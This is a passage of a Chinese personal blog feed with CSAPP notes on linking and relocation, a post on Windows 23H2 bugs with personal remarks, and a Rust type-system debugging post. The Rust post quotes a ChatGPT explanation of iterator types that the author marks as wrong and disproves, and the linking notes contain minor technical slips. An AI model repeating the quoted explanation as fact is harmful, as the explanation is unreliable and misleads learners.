class="line"><span class="string"></span></span><br><span class="line"><span class="string">      翻译:</span></span><br><span class="line"><span class="string">    0x00000000:  55              push   rbp</span></span><br><span class="line"><span class="string">    0x00000001:  48 89 e5        mov    rbp, rsp</span></span><br><span class="line"><span class="string">    0x00000004:  b8 00 00 00 00  mov    eax, 0</span></span><br><span class="line"><span class="string">    0x00000009:  e8 00 00 00 00  call   0x0000000e  (这里通常是一个占位符，编译后会被替换)</span></span><br><span class="line"><span class="string">    0x0000000e:  90              nop</span></span><br><span class="line"><span class="string">    0x0000000f:  5d              pop    rbp</span></span><br><span class="line"><span class="string">    0x00000010:  c3              ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ readelf -x .data elf.out</span></span><br><span class="line"><span class="string">Hex dump of section &#x27;</span>.data<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">  0x00000000 00000000 01000000 02000000 03000000 ...............</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    不是傻子都能看明白。</span></span><br></pre></td></tr></table></figure><blockquote><p>UNDEF, COMMON, ABS 是三个仅存在于可重定位文件中的伪节, 分别表示<em>当前还未定义的外部符号</em>, <em>未初始化的全局变量</em> 和<em>不应该被重定位的符号</em></p><p>*bss: 鉴于新版 GCC 已经自动开启 <code>-fno-common</code>,这里不再详细说明 COMMON</p></blockquote><p>理解了各个节之后, 还需要理解如下定义:</p><ul><li><p>全局符号:在某个模块中定义的<strong>非静态</strong>全局变量或函数,可以被其他模块<strong>引用</strong></p></li><li><p>外部符号: 引用的其他模块符号的符号引用</p></li><li><p>局部符号: 静态全局变量或静态函数, 不能被其他模块引用</p></li></ul><p>考虑如何区分相同名字的全局符号:</p><ul><li>强符号: 函数 或 已初始化的全局变量</li><li>弱符号: 未初始化的全局变量或</li></ul><p>规则是: 有强符号优先解析为强符号, 多个强符号同名报错,多个弱符号任选一个</p><p>这个规则会导致一些麻烦的事情</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> y = <span class="number">15212</span>;</span><br><span class="line"><span class="type">int</span> x = <span class="number">15213</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; f(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bar.c</span></span><br><span class="line"><span class="type">double</span> x;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span> &#123; x = <span class="number">-0.0</span>; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时 <code>x : int</code> 是强符号, 调用 <code>f</code> 时将会使用<code>x : int</code> 赋值为 <code>-0.0</code><br />然而栈里是这样排布的 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| y : 0x601024, 四字节 |</span><br><span class="line">| x : 0x601020, 四字节 |</span><br></pre></td></tr></table></figure>浮点数字面量<code>-0.0</code>是八字节的, 除了填充 x 的四字节还会填充 y的四字节导致 y 变化</p><p>关于链接器解析符号的过程, E, U, D 集合的部分比较简单不再赘述,直接翻书即可</p><blockquote><p>由于新版 GCC 已经默认 <code>fno-common</code>, 这段代码会报错</p></blockquote><h3 id="重定位">重定位</h3><p>重定位的过程也分为两个部分: 1. section 和 符号定义 的重定位 (取得<code>ADDR(r.symbol)</code>)</p><ol start="2" type="1"><li><p>符号引用的重定位 (<code>R_X86_64_PC32</code>, 或<code>R_X86_64_32</code> 两种方式)</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每个重定位条目如下: </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">long</span> offset;   <span class="comment">/* Offset of the reference to relocate */</span></span><br><span class="line"><span class="type">long</span> type: <span class="number">32</span>, <span class="comment">/* Relocation type */</span></span><br><span class="line">symbol: <span class="number">32</span>; <span class="comment">/* Symbol table index */</span> </span><br><span class="line">    <span class="type">long</span> addend;<span class="comment">/* 这个修正下面会说 */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于一个 section s 和 一个 重定位条目结构体 r</span></span><br><span class="line"><span class="comment">// 获取符号引用的指针</span></span><br><span class="line">refptr = s + r.offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是绝对重定位 R_X86_64_32, 直接赋值</span></span><br><span class="line">*refptr = ADDR(r.symbol) + addend; <span class="comment">/* addend == 0 */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 如果是相对重定位 R_X86_64_PC32, 需要补正, 下面会解释</span></span><br><span class="line">*refptr = ADDR(r.symbol) + addend - (ADDR(s) + r.offset) <span class="comment">/* addend == -4 */</span></span><br></pre></td></tr></table></figure></p><p>对于相对重定位的补正, 我们举个例子:</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1: callq 0x9</span><br></pre></td></tr></table></figure></p><p>注意在重定位前 <code>0x9</code> 的位置通常是个占位符,这里是说明被调用的代码的位置是 <code>0x9</code></p><p><code>callq</code> 机器码的位置是 <code>0x1</code>,<code>refptr</code> 指向 <code>0x2</code> 的位置,要修改为相对重定向后的地址</p><p>先手动计算一下这个位置应当被替换为的值:</p><p>我们知道 call 指令是压 PC 入栈作为返回值 + 跳转到 PC + 参数 的位置,设我们需要重定位替换的参数为 x</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x9 == PC + x</span><br></pre></td></tr></table></figure></p><p>因为 <code>callq</code> 在 <code>0x1</code>, 而通常 x86_64一条指令五个字节(例如 AT&amp;T <code>movl $1, %eax</code> 机器码是<code>B8 01 00 00 00</code>) 所以当前的 PC 应为<code>0x1 + 0x5 = 0x6</code></p><p>得到 <code>x = 0x3</code>.</p><p>那么我们如何通过上面的代码实现这个 <code>0x3</code> 的计算呢?实际上就是靠 <code>addend</code> 的补正作用</p><p>列出一些参数:</p><table><thead><tr><th style="text-align: center;">内容</th><th style="text-align: center;">值</th></tr></thead><tbody><tr><td style="text-align: center;"><code>ADDR(r.symbol)</code></td><td style="text-align: center;"><code>0x9</code></td></tr><tr><td style="text-align: center;"><code>addend</code></td><td style="text-align: center;">待计算</td></tr><tr><td style="text-align: center;"><code>ADDR(s) + r.offset</code></td><td style="text-align: center;"><code>0x2</code></td></tr></tbody></table><p>之所以是 <code>0x2</code> 而不是 <code>0x1</code> 是因为<code>ADDR(s) + r.offset</code>是段起始地址+<strong>重定位条目位置相对的偏移</strong>,也就是说实际上应该是 <code>callq</code> 那个参数(当前为占位符) 的地址,这也启发我们知道这个值其实就是 <code>callq</code> 的地址 + 1</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x9 = PC + x</span><br><span class="line">*refptr = x </span><br><span class="line">        = 0x9 - PC</span><br><span class="line">        = 0x9 - (ADDR(callq) + 5) </span><br><span class="line">    = 0x9 - (ADDR(callq) + 1 + 4)</span><br><span class="line">  = ADDR(r.symbol) - (ADDR(S) + r.offset) - 4 </span><br></pre></td></tr></table></figure></p><p>于是得出 <code>addend</code> 实际上为 <spanclass="math inline">\(-4\)</span></p><p>十六进制写 <span class="math inline">\(\LaTeX\)</span> 太怪了,就贴了个 plain text</p></li></ol><h2 id="可执行文件">可执行文件:</h2><p>可执行文件无伪节, 无 <code>.rel</code> section.</p><p>任何 Linux 可执行文件都是 <code>execve</code>系统调用通过一段操作系统驻留在主存内的代码 <code>loader</code> 执行的<code>loader</code> 会试图调用 <code>ctrl.o</code> 中的<code>_start</code> 函数, 后者会继续调用 <code>libc.so</code> 中的<code>__libc_start_main</code> 函数, 最后才会调用到用户的<code>main</code> 函数.</p><p>Linux x86_64 ELF64 下 <code>.text</code> 从 <code>0x400000</code>开始.</p><h2 id="动态链接">动态链接:</h2><p>动态链接是运行时将内存段中的符号定义重定位到内存段中的符号引用中,<code>.interp</code> section记录了链接器的路径</p><p>可用 <code>dlopen, dlsym, dlclose, dlerror</code> 来在 C代码中手动加载动态链接库(.so), 加载符号等</p><p>由于共享库在内存中的加载位置不确定(你总不能固定下来位置给某个库然后一些不需要的库也浪费着占位吧),所以需要位置无关代码(Position Independent Code, PIC. GCC 中 使用<code>-fpic</code> 调用</p><h3 id="pic-数据引用">PIC 数据引用:</h3><p>原理: 数据段与代码段之间的距离是位置无关的(固定的), 设为 delta.在代码段引用数据段的数据的时候, 只需要在数据段开头的 GOT (Global OffsetTable) 里存下符号定义的位置(<code>&amp;sym</code>), 则 delta 就是 PC 和<code>GOT[i]</code> 的差值. 编译器为 GOT 每一个 8字节条目生成重定位条目, 代码里随便写符号引用, 编译为可重定位目标文件时直接引用 <code>PC + delta</code> (即 <code>GOT[i]</code>)</p><p>此时我们还需要确保在 GOT 存的 <code>&amp;sym</code> 也是位置无关的,所以在加载时利用动态链接器重定向每个 GOT[i]的实际符号定义的位置就行了</p><h3 id="pic-函数调用">PIC 函数调用:</h3><p>利用 GOT 和 PLT (Procedure Linkage Table, 在代码段) 的协作:</p><p>首先介绍一些约定俗成的 PLT 位置值:</p><ul><li><p><code>PLT[0]</code> 处的代码传参并跳转到动态链接器</p></li><li><p><code>PLT[1]</code> 跳 <code>__libc_start_main</code></p></li><li><p>剩下的条目用于处理需要调用的位置无关函数</p></li></ul><p>PIC 的函数调用不会直接重定向到函数地址,因为不知道动态链接库在内存中加载的具体位置 调用某个函数时,我们调用这个函数对应的 PLT 条目 <code>func@PLT</code>,具体流程如下(配合书上的图阅读):</p><ol type="1"><li>代码中 call func@PLT, 压入下一条地址作为返回地址并且跳转到对应的 PLT条目,</li><li>而这个 PLT 条目会先跳到符号的 GOT 条目,</li><li>而 GOT 条目初始指向其 PLT 条目的下一条(即顺序执行,之所以这么来回跳是为了延迟绑定, 绑定后就直接跳到 GOT对应的实际地址而非继续顺序执行了)</li><li>而这个”下一条”就是 <code>push 0x1; jmp *PLT[0];</code>,<code>0x1</code> 是 <code>addvec</code> 的 ID</li><li>而 PLT[0] 干的是: 传入必要的重定位表地址作为参数,跳转到动态链接器</li><li>动态链接器会处理重定位然后绑定对应的 GOT 条目, 然后跳转到 func</li><li>func 结束后会从之前的 call 压入的返回地址返回</li></ol><h2 id="库打桩">库打桩:</h2><ul><li>编译期打桩: <code>-I.</code> 先找当前目录头文件,在头文件里打包库函数</li><li>链接时打桩: 利用静态符号解析: <code>-Wl,--wrap,malloc</code> 把malloc 解析为 __wrap_malloc</li><li>运行时打桩: 利用动态链接符号解析:<code>LD_PRELOAD="./xxx.so" ./prog</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;链接第七章-all&quot;&gt;链接(第七章 ALL)&lt;/h1&gt;
&lt;p&gt;这章内容很短, 就是书中和 15213 都有意隐去了很多细节,
自己去理解思考这些细节会很麻烦&lt;/p&gt;
&lt;p&gt;另外 section 的翻译易引起歧义, 这里不作翻译&lt;/p&gt;
&lt;h2 id=&quot;静态链接&quot;&gt;静态链接:&lt;/h2&gt;
&lt;p&gt;静态链接包括两个阶段, 符号解析和重定位:&lt;/p&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
    <category term="CSAPP/cmu15213" scheme="https://amiriox.github.io/tags/CSAPP-cmu15213/"/>
    
  </entry>
  
  <entry>
    <title>更新到 23H2 的 bug</title>
    <link href="https://amiriox.github.io/2025/02/13/23H2-bugs/"/>
    <id>https://amiriox.github.io/2025/02/13/23H2-bugs/</id>
    <published>2025-02-13T15:26:26.000Z</published>
    <updated>2025-02-13T16:20:27.405Z</updated>
    
    <content type="html"><![CDATA[<p>前两天感觉每次通过 <code>/etc/resolv.conf</code> 获取 nameserver的方法太丑陋了, 查了下 WSL2 有镜像网络模式, 但是实测 22H2 没法用,只能更新了, 于是:</p><ul><li><p>文件资源管理器<strong>极大频率</strong>卡死,基本打开几分钟之后就卡, 右键菜单呼出再点也卡。</p><ul><li><p>升系统版本</p></li><li><p>文件资源管理器</p></li><li><p>经常无响应</p></li><li><p>最难绷</p></li></ul></li><li><p>任务栏小概率卡死, 需要重启 <code>explorer.exe</code>。</p></li><li><p>WSL2 启动时间变得很长, 而且关闭 WSL2的策略也改得不如以前。</p></li><li><p>(优点) 对于二合一特别优化的任务栏不错, 估计是沾了 Surface Go的光。</p></li></ul><p>明天考科三, 争取大一拿下驾照喵。</p><p>由于没什么朋友所以决定有什么b话就都往博客写<del>降低博客含金量</del>。</p><p>说一下近况:</p><ul><li><p>情绪很低沉, 太多事情积累到这个程度还一直被压着,已经不是常规手段能缓解的了</p></li><li><p>但我除了继续压着然后继续生活学习也没什么好办法,“理想的生活”离我还是太远了</p></li><li><p>很疲惫很孤独, 很压抑很痛苦, 但是也找不到人说,也不想给人添麻烦。</p></li><li><p>感觉热爱的一切都成了累赘, 不知道应该做些什么</p></li><li><p>但我的身体不允许我认输, 我还得拖着疲惫的精神继续向前走</p></li><li><p>永远不要放弃战斗。</p></li></ul>    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200;300;400&display=swap" rel="stylesheet">    <style>        @keyframes float {            0% { transform: translateY(0px) rotate(0deg); }            50% { transform: translateY(-20px) rotate(5deg); }            100% { transform: translateY(0px) rotate(0deg); }        }        @keyframes glow {            0% { opacity: 0.3; transform: scale(1); }            50% { opacity: 0.5; transform: scale(1.1); }            100% { opacity: 0.3; transform: scale(1); }        }        .container {            max-width: 800px;            margin-left: 0%;            transform: translateY(-10%);            position: relative;            z-index: 1;        }        .error-text {            font-family: 'Noto Serif SC', "PingFang SC", "Microsoft YaHei", serif;            font-size: 28px;            color: #e6d5c3;            line-height: 1.8;            margin-left: 5px;            font-weight: 300;            letter-spacing: 2px;        }    </style>    <div class="container">          <br><br><br>        <div class="error-text">秋风起<br>蒲公英散落<br>远方有灯</div>    </div>]]></content>
    
    
    <summary type="html">&lt;p&gt;前两天感觉每次通过 &lt;code&gt;/etc/resolv.conf&lt;/code&gt; 获取 nameserver
的方法太丑陋了, 查了下 WSL2 有镜像网络模式, 但是实测 22H2 没法用,
只能更新了, 于是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文件资源管理器&lt;strong&gt;极大频率&lt;/strong&gt;卡死,
基本打开几分钟之后就卡, 右键菜单呼出再点也卡。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;升系统版本&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;文件资源管理器&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;经常无响应&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;最难绷&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;任务栏小概率卡死, 需要重启 &lt;code&gt;explorer.exe&lt;/code&gt;。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;WSL2 启动时间变得很长, 而且关闭 WSL2
的策略也改得不如以前。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;(优点) 对于二合一特别优化的任务栏不错, 估计是沾了 Surface Go
的光。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;明天考科三, 争取大一拿下驾照喵。&lt;/p&gt;
&lt;p&gt;由于没什么朋友所以决定有什么b话就都往博客写
&lt;del&gt;降低博客含金量&lt;/del&gt;。&lt;/p&gt;
&lt;p&gt;说一下近况:&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://amiriox.github.io/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次 Rust 类型系统的问题解决</title>
    <link href="https://amiriox.github.io/2025/01/31/problem-rust-ref/"/>
    <id>https://amiriox.github.io/2025/01/31/problem-rust-ref/</id>
    <published>2025-01-31T09:26:06.000Z</published>
    <updated>2025-02-13T16:15:24.864Z</updated>
    
    <content type="html"><![CDATA[<p>在做 Codeforces Educational Round 169 D Colored Portals 时，需要找到i 前面距离 i 最近的颜色不完全相同但也不完全不同的 j，我随手写了个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> vector&lt;string&gt; type = &#123;<span class="string">&quot;BG&quot;</span>, <span class="string">&quot;BR&quot;</span>, <span class="string">&quot;BY&quot;</span>, <span class="string">&quot;GR&quot;</span>, <span class="string">&quot;GY&quot;</span>, <span class="string">&quot;RY&quot;</span>&#125;;</span><br><span class="line">map&lt;string, <span class="type">int</span>&gt; m;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">lc</span><span class="params">(n, <span class="number">-1</span>)</span>, <span class="title">rc</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> condi = m | <span class="built_in">filter</span>([&amp;](<span class="type">const</span> <span class="keyword">auto</span> &amp;p) &#123; <span class="keyword">return</span> p.first != in[i] &amp;&amp; <span class="built_in">has_same</span>(p.first, in[i]); &#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> lci = ranges::<span class="built_in">max_element</span>(</span><br><span class="line">                condi, [](<span class="type">const</span> <span class="keyword">auto</span> &amp;a, <span class="type">const</span> <span class="keyword">auto</span> &amp;b) &#123; <span class="keyword">return</span> a.second &lt; b.second; &#125;);</span><br><span class="line">            lci != ranges::<span class="built_in">end</span>(condi)) &#123;</span><br><span class="line">            lc[i] = lci-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    m[in[i]] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后吐槽了下 C++ 没有 <code>.iter().filter()</code> 或者<code>.iter().map()</code> 这种写法</p><p>于是我就建了个 D.rs 写了个 Rust 版本的:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">has_same</span>(a: &amp;[<span class="type">char</span>; <span class="number">2</span>], b: &amp;[<span class="type">char</span>; <span class="number">2</span>]) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    (a[<span class="number">0</span>] == b[<span class="number">0</span>] || a[<span class="number">0</span>] == b[<span class="number">1</span>]) || (a[<span class="number">1</span>] == b[<span class="number">0</span>] || a[<span class="number">1</span>] == b[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">n</span> : <span class="type">usize</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">inv</span> : <span class="type">Vec</span>&lt;[<span class="type">char</span>; <span class="number">2</span>]&gt; = <span class="built_in">vec!</span>[[<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;R&#x27;</span>], [<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;R&#x27;</span>], [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>], [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;R&#x27;</span>]]; <span class="comment">// simple</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span> : HashMap&lt;[<span class="type">char</span>; <span class="number">2</span>], <span class="type">i32</span>&gt; = HashMap::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">lc</span> = <span class="built_in">vec!</span>[-<span class="number">1</span>; n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0usize</span>..n &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(lci) = map.<span class="title function_ invoke__">iter</span>()</span><br><span class="line">            .<span class="title function_ invoke__">filter</span>(|(key, _)| *key != &amp;inv[i] &amp;&amp; <span class="title function_ invoke__">has_same</span>(key, &amp;inv[i]))</span><br><span class="line">            .<span class="title function_ invoke__">max_by</span>(|a, b| a.<span class="number">1</span>.<span class="title function_ invoke__">cmp</span>(&amp;b.<span class="number">1</span>)) &#123;</span><br><span class="line">            lc[i] = *lci.<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        map.<span class="title function_ invoke__">insert</span>(inv[i].<span class="title function_ invoke__">clone</span>(), i <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, lc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我不是什么 Rust 高手但至少 rustlings 是写完了，然而上次写 rs还是三四个月之前了，所以这里的 <code>*key != &amp;inv[i]</code>一开始写成 <code>*key = inv[i]</code>了，然后发现了一个有意思的现象：</p><ul><li><p>当我写 <code>key != &amp;inv[i]</code> 时报错<code>no implement for &amp;[char; 2] ==[char;2]</code></p></li><li><p>当我写 <code>key != inv[i]</code> 时报错<code>no implement for &amp;&amp;[char;2] == [char;2]</code></p></li></ul><p>这我就有两点疑问：</p><ol type="1"><li><code>&amp;inv[i]</code> 不应该是 <code>&amp;[char;2]</code>吗？为什么这里说他是 <code>[char;2]</code> ?</li><li><code>key</code> 的类型为什么变化了？</li></ol><p>有意思的是这个问题能把 4o 或者 r1全爆了，前者胡言乱语后者卡在深度思考的逻辑链里出不来，当然这里 4o 应该是OpenAI 为了卖 o1 强行降智了</p><p>我回想了一下引用那一节(<del>其实是根本没想起来什么直接翻书去了</del>)发现有个自动解引用和自动借用机制存在，简单说就是引用比较引用自动解引用，需要引用的地方可以自动引用</p><p>于是就有了以下可以解释通的说法：</p><ul><li>对于<code>key != &amp;inv[i]</code> 时两边分别为<code>&amp;&amp;[char; 2] != &amp;[char; 2]</code>， 同时自动解引用就是<code>&amp;[char; 2] != [char; 2]</code>，根据报错误以为<code>key</code> 是 <code>&amp;[char; 2]</code> 而<code>&amp;inv[i]</code> 是 <code>[char; 2]</code> 了</li><li>对于<code>key != inv[i]</code> 时两边分别为<code>&amp;&amp;[char; 2]</code> 和 <code>[char; 2]</code></li></ul><p>这就很 make sense 了，但还有一个问题可以思考，key 的<code>&amp;&amp;[char; 2]</code> 类型是怎么来的？</p><p><code>ChatGPT 4o</code> 做出了<strong>错误</strong>的回答:</p><blockquote><p><strong>如下解释是错误的！！！</strong></p><p>好的，我明白了你在问什么。</p><p>当你执行 <code>map.iter().next()</code> 时，返回的类型是<code>Option&lt;(&amp;K, &amp;V)&gt;</code>，而不是<code>Option&lt;&amp;(&amp;K, &amp;V)&gt;</code>。这看起来有些反直觉，但实际上是因为<code>map.iter()</code> 本身已经返回了每个元素的引用，而 .next()返回的是引用的元素本身，而不是引用的引用。 解释：</p><ol type="1"><li><p><code>map.iter()</code> 返回 <code>&amp;(&amp;K, &amp;V)</code>：<code>map.iter()</code> 返回的是 HashMap 中元素的 引用，也就是<code>&amp;(&amp;K, &amp;V)</code>，这意味着你得到了对 HashMap中每个二元组 (K, V) 的引用。</p><p>其中 <code>&amp;K</code> 是对键 K 的引用。 <code>&amp;V</code> 是对值V 的引用。</p><p>所以 <code>map.iter()</code> 迭代的每一项类型是<code>(&amp;K, &amp;V)</code>，但是由于这些是对元素的引用，所以整个类型是<code>&amp;(&amp;K, &amp;V)</code>，即 HashMap 中元素的 引用。</p></li><li><p><code>.next()</code> 返回的是<code>Option&lt;(&amp;K, &amp;V)&gt;</code>： <code>.next()</code> 是对<code>map.iter()</code>返回的迭代器的调用，它会返回迭代器中的下一个元素。</p><p>在这种情况下，<code>map.iter()</code> 本身返回的是每个元素的引用，而<code>next()</code> 直接返回这些元素的引用，因此返回类型是<code>Option&lt;(&amp;K, &amp;V)&gt;</code>，这就是迭代器的下一项是对元素的引用。</p><p>可以理解为 <code>next()</code> 相当于解了一层引用。</p></li></ol><p>当你调用 <code>map.iter()</code> 时，它返回的是<code>&amp;(&amp;K, &amp;V)</code>，也就是对二元组的引用，且这个二元组本身已经包含了对键和值的引用。所以，<code>next()</code>方法直接返回这个引用，并解开了一个层级，即返回了<code>Option&lt;(&amp;K, &amp;V)&gt;</code>，而不是<code>Option&lt;&amp;(&amp;K, &amp;V)&gt;</code>。</p><p>总结起来：</p><ul><li><p><code>map.iter()</code> 返回的是对 <code>(K, V)</code>元素的引用，即 <code>&amp;(&amp;K, &amp;V)</code>。</p></li><li><p><code>.next()</code> 解开了这层引用，直接返回了<code>Option&lt;(&amp;K, &amp;V)&gt;</code>。</p></li></ul><p>这样就可以避免不必要的引用，简化了类型。</p></blockquote><p>如果我到这就信了就完了，事实上对于你无法验证答案真伪的问题不要问大模型，这里只是希望它提供一点灵感思路。</p><p>我查看 Rust 文档发现 <code>.iter()</code> 的例子中，普通数组的<code>.iter().next()</code> 实际上是 <code>Option&lt;&amp;T&gt;</code>即 <code>Some(&amp;T)</code> 或 <code>None</code>，也就是说并不存在“next 解了一层引用” 之类的说法（但它其实有一部分说的是对的，AI就是这样半真半假不能全信），此时它还在狡辩说只有 HashMap 的 next会解引用。</p><p>估计出幻觉了，于是在编辑器中写以下代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">map</span> = HashMap::&lt;<span class="type">i32</span>, <span class="type">i32</span>&gt;::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">vecs</span> = <span class="type">Vec</span>::&lt;(<span class="type">i32</span>, <span class="type">i32</span>)&gt;::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">_map_iter</span> = map.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">next</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">_vecs_iter</span> = vecs.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">next</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">_arr_iter</span> = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">next</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按 <code>Shift + K</code> (即 neovim 的 <code>K</code> ) 借用rust-analyzer LSP 查看类型，分别是：</p><ol type="1"><li><p><code>Option&lt;(&amp;i32, &amp;i32)&gt;</code></p></li><li><p><code>Option&lt;&amp;(i32, i32)&gt;</code></p></li><li><p><code>Option&lt;&amp;i32&gt;</code></p></li></ol><p>这里我们知道：</p><ul><li><p>Rust的迭代器实际上是容器元素的引用而不是值，出于效率等目的。</p></li><li><p>Vec的情况符合我们的预期，即迭代器是对容器里某个元素整体的引用</p></li></ul><p>再次翻阅 